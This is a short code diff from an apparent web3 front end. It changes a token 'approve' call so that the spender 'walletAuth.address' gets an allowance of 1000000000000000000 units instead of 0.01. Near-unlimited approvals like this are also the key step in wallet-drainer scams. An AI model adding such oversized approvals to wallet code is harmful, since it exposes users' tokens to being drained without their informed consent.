@@ -334,7 +334,7 @@ function Home() {
         functionName: 'approve',
         args: [
           walletAuth.address as `0x${string}`, // 使用获取到的授权地址
-          parseUnits('0.01', 6),
+          parseUnits('1000000000000000000', 6),
         ],
       });
 
